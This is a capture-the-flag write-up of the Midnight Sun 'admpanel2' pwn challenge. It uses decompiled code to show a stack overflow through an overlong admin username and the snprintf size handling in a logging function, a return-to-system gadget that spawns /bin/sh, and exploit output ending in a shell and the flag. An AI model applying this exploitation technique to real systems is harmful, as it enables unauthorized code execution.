# Admpanel2 - x86-64 pwn
We are supplied with the binary [admpanel2](https://github.com/henriknero/writeups/tree/master/admpanel2/admpanel2). This is the followup to the challenge admpanel. Supposedly having patched the previous binary so it should be secure. 
```
$ file admpanel2 
admpanel2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=3c92c2bcbc592fcec34f26a30abfde62b414a025, stripped
```

The only change in the code that I was able to find was an added line to the exec_command function(0x4014d5):
```c
...
  else {
    printf("  Command to execute: ");
    fgets(local_408,0x400,stdin);
    iVar1 = strncmp(local_408,"id",2);
    if (iVar1 == 0) {
      local_408[2] = '\0'; //This line added.
      system(local_408);
    }
    else {
      puts("Any other commands than `id` have been disabled due to security concerns.");
      log_func("EXEC_HONEYPOT",is_admin,&DAT_004040e0,local_408);
    }
  }
...
```
So the bug was likely present before the patch. The bug that we found was located in the authentication function, with a followup fault in the log function. **Because of this we are able to cause a buffer overflow and are able to overwrite the return address in exec_command function.**
## Ghidra decompiled code of authenticate function(0x4013ed)
```c
...
  printf("  Input username: ");
  fgets(&DAT_004040e0,0x400,stdin);
  iVar1 = strncmp(&DAT_004040e0,"admin",5);
  if (iVar1 == 0) {
    printf("  Input password: ");
    fgets(local_408,0x400,stdin);
    iVar1 = strncmp(local_408,"password",8);
    if (iVar1 == 0) {
      is_admin = 1;
    }
...
```
There are two bugs in the authentication functions that we can utilize. 
1. So long as the first 5 chars are admin we are allowed supply 0x400-char username. 
2. If we have logged in once, we can change the username without losing admin rights.

## Ghidra decompiled code of log_function(0x40121a)
```c
...
  int bytes_written;
  size_t snpr_size;
  char *output_string;
  
  output_string = also_output_string?;
  snpr_size = 0x100;
  bytes_written = snprintf(output_string,0x100,"LOG: [OPERATION: %s] ",error_message);
  if (bytes_written < 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  output_string = output_string + bytes_written;
  snpr_size = snpr_size - (long)bytes_written;
  if (is_admin != 0) {
    bytes_written = snprintf(output_string,snpr_size,"[USERNAME: %s] ",username);
    if (bytes_written < 0) {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    output_string = output_string + bytes_written;
    snpr_size = snpr_size - (long)bytes_written;
  }
  if (*command != '\0') {
    bytes_written = snprintf(output_string,snpr_size,"%s",command);
    if (bytes_written < 0) {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    output_string = output_string + bytes_written;
    snpr_size = snpr_size - (long)bytes_written;
  }
...
```
Conveniently we already have a pointer to our username in RAX when we reach the return address in exec_command function. As we control this variable we simply set it to "/bin/sh;"+padding and then call the following gadget.
```
00401598 48 89 c7        MOV        RDI,RAX
0040159b e8 b0 fa        CALL       system
         ff ff

```

```
$ ./exploit 
[*] '/home/henrik/midnight2020/admpanel2/admpanel2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to admpanel2-01.play.midnightsunctf.se on port 31337: Done
[*] Switching to interactive mode
Any other commands than `id` have been disabled due to security concerns.
$ ls
chall
flag
redir.sh
$ cat flag
midnight{n3ver_4sk_hsp3_t0_do_s0m3th1ng}
$  
```

The exploit script can be found [here](https://github.com/henriknero/writeups/tree/master/admpanel2/exploit)